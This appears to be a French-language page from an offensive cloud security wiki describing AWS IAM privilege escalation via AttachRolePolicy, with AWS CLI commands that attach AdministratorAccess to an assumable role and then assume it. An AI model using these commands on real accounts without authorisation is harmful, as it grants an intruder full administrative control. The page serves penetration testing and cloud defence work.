---
title: "AttachRolePolicy : attacher une politique privilégiée à un rôle que vous pouvez assumer"
description: "iam:AttachRolePolicy pour attacher une politique managée privilégiée à un rôle que vous pouvez assumer."
keywords:
  - AttachRolePolicy
  - role
  - managed policy
  - AdministratorAccess
  - attach
---

# AttachRolePolicy

`iam:AttachRolePolicy` attache une politique managée à un rôle. Si vous pouvez déjà assumer un rôle (ou le transmettre à un service), attacher `AdministratorAccess` à ce rôle le transforme en rôle administrateur que vous utilisez ensuite.

## Attacher puis assumer

```bash
aws iam attach-role-policy --role-name <assumable-role> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<assumable-role> \
  --role-session-name s
```

## Notes d'exploitation

- À combiner avec l'[assomption de rôle](../../role-assumption/index.md) : l'attachement n'est utile que sur un rôle que vous pouvez atteindre, en l'assumant ou en le transmettant à un service.
- Les identifiants de session préexistants pour le rôle ne prennent pas en compte la nouvelle politique tant qu'un nouveau `AssumeRole` n'est pas effectué.

## Outils

- **AWS CLI** (`iam attach-role-policy`, `sts assume-role`).
- **Pacu** (`iam__privesc_scan`).

## Références

- [Rhino Security Labs : élévation de privilèges AWS (AttachRolePolicy)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox : iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
